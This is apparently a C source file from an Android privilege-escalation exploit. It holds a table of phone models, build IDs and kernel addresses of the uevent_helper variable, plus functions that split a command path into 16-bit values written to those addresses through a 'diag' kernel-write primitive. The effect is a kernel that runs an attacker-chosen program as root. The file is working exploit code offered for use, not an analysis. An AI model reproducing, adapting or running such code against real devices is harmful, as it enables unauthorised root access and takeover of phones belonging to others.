/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#include "libdiagexploit/diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned int uevent_helper_address;
} supported_device;

supported_device supported_devices[] = {
  { "F-03D",  "V24R33Cc",     0xc0769f24 },
  { "SC-05D", "IMM76D.OMLPL", 0xc0c90fac },
  { "SO-05D", "7.0.D.1.117",  0xc0b6cc38 },
  { "IS17SH", "01.00.03",     0xc0a46694 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

unsigned int
get_uevent_helper_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].uevent_helper_address;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static int
compare(const void *a , const void *b)
{
  const struct diag_values *x = a;
  const struct diag_values *y = b;
  if (x->value < y->value) {
    return -1;
  }
  if (x->value == y->value) {
    return 0;
  }
  return 1;
}

int
prepare_injection_data(struct diag_values *data, size_t data_size,
                       unsigned int uevent_helper_address,
                       const char *helper_command_path)
{
  int i, data_length;

  for (i = 0, data_length = 0;
       i < strlen(helper_command_path) && i < data_size;
       i += 2) {
    data[data_length].address = uevent_helper_address + i;
    data[data_length].value = helper_command_path[i] | (helper_command_path[i + 1] << 8);
    data_length++;
  }

  qsort(data, data_length, sizeof(struct diag_values), compare);
  return data_length;
}

